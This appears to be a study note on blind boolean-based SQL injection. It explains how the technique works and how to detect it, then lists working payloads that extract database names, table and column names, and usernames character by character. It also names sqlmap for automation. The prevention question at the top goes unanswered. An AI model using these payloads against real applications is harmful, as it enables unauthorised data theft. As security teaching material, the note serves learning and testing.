- How can developers prevent Blind Boolean-Based SQL Injection?

## Notes

### What it is

**Blind Boolean-Based SQL Injection** is a technique used when an application is vulnerable to SQL Injection but does not return any visible output or error messages to the attacker. Instead of relying on direct responses, the attacker infers information based on how the server behaves when certain injected conditions evaluate to true or false.

By crafting SQL queries that evaluate to either true or false, attackers observe differences in the HTTP response (such as page content, redirection behavior, HTTP status codes, or even response lengths). These observable differences allow the attacker to extract information from the database **bit by bit** (or rather, character by character).

Unlike time-based injection, which relies on server response delays, boolean-based injection depends entirely on the application rendering different content depending on the query result.

### How to identify it

Detection starts with regular SQLi testing:

1. **Initial payloads**:
    
    Test input fields with common payloads:
    
    ```sql
    ' OR 1=1; -- 
    ' UNION SELECT NULL; -- 
    ```
    
    If the server returns different responses (e.g., page loads normally for `1=1` and returns an error or empty page for `1=2`), it may indicate a blind boolean-based injection point.
    
2. **No visible error, but observable behavior changes**:
    
    Sometimes even small differences in page size, content, or structure (headers, HTML body, etc.) can reveal the truth value of a condition.
    
3. **Consistency across multiple tests**:
If the behavior is repeatable across multiple injected true/false conditions, it's a strong indicator.

### How to exploit it

The exploitation process consists of crafting payloads that check specific conditions, and observing how the application responds.

Some of the most common functions used:

- **`SUBSTRING(string, position, length)`**
    
    Extracts substrings to isolate individual characters.
    
- **`ASCII(character)`**
    
    Converts a character to its ASCII value for numeric comparison.
    
- **`LENGTH(string)`**
    
    Retrieves the length of a string.
    
- **`CASE WHEN` or `IF()`**
    
    Conditional evaluation to return different outputs based on truth values.
    

**Payload examples**

Determine database length

```bash
' AND LENGTH(DATABASE())=6 -- 
```

If the response differs when testing different values, you can determine the correct length.
Extract database name character by character:

```bash
' AND ASCII(SUBSTRING(DATABASE(),1,1)) > 100 -- 
```

By incrementally adjusting the value (`100`, `110`, `115`, etc.), you can binary-search the ASCII code for each character.

Suppose you want to extract the first character:

```bash
' AND ASCII(SUBSTRING(DATABASE(),1,1))=116 -- 
```

If the response shows that the condition is true, then the first character is `t` (`ASCII(116)`).

Repeat the process for the next positions:

```bash
' AND ASCII(SUBSTRING(DATABASE(),2,1))=97 -- 
' AND ASCII(SUBSTRING(DATABASE(),3,1))=114 -- 
...
```

Extracting table names:

```bash
' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 0,1), 1, 1))=117 -- 
```

Extracting column names:

```bash
' AND ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1), 1, 1))=105 -- 
```

Extracting data from table:

```bash
' AND ASCII(SUBSTRING((SELECT username FROM users LIMIT 0,1), 1, 1))=97 -- 
```

In real-world scenarios, attackers automate this entire process using tools like:

- **`sqlmap`** (excellent support for boolean-based blind extraction)
- Custom Python scripts with HTTP requests and binary search logic.

## Summary

**Blind Boolean-Based SQL Injection** is a powerful attack technique that allows data extraction even when the application provides no visible errors or output. The attacker carefully crafts conditional payloads and observes binary responses to infer database content one character at a time.

Though slower than classical SQLi, boolean-based injection remains highly effective against hardened applications that suppress verbose error handling.
